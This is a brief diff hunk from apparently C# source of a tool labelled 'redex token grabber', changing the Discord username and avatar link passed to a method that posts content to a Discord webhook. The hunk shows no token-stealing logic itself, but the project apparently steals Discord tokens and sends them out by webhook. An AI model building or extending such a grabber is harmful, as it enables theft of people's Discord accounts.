@@ -85,12 +85,12 @@ public static void sendWebHook(string discordWebHook,string content)
                 }) + "´´´"
             },
             {
-                "the soviet guy#7119"
+                "⛧♱𝖎𝖇𝖊𝖓𝖑𝖆𝖓𝖉⛧#9921"
                 "redex token grabber"
             },
             {
                 "avatar_url",
-                "https://discord.com/channels/@me/918347100335538227"
+                "https://discord.com/channels/@me/910580649482674176"
 
             }
         };
